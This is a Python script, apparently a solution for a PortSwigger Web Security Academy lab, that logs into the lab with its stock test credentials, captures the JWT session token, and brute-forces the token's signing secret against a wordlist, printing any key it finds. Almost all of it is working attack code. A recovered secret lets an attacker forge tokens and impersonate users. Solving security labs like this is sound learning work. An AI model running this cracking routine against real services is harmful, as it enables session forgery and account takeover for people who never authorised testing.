import jwt
import base64
import requests
from bs4 import BeautifulSoup

# Login & Get JWT Token

session = requests.Session()

url = "https://0adb0004044058dab1fd32d700da000c.web-security-academy.net/login"
response = session.get(url)

soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,  
    "username": "wiener",
    "password": "peter"
}

response = session.post(url, data=data)

cookies = session.cookies.get_dict()
jwt_token = cookies.get("session")  
print(f"JWT Token: {jwt_token}\n")

wordlist = 'jwt.secrets.list'

def fuzz(secret_key, algo):
        try:
                decoded = jwt.decode(jwt_token, secret_key, algorithms=[algo])
                print(f"Valid key found: {secret_key}")
                print(f"Decoded payload: {decoded}")
                return True
        except jwt.InvalidSignatureError:
                return False

def fuzz_secret_key(wordlist):
        header = jwt.get_unverified_header(jwt_token)
        algo = header.get("alg")
        if not algo:
                print("Algorithm not found in JWT header.")
                return None
        else:
                print(f"Algorithm: {algo}")
        with open(wordlist, "r") as file:
                for line in file:
                        secret_key = line.strip()
                        if fuzz(secret_key, algo):
                                return secret_key
        return None

found_key = fuzz_secret_key(wordlist)
if found_key:
        print(f"\nSecret key found: {found_key}")
else:
        print("No valid secret key found.")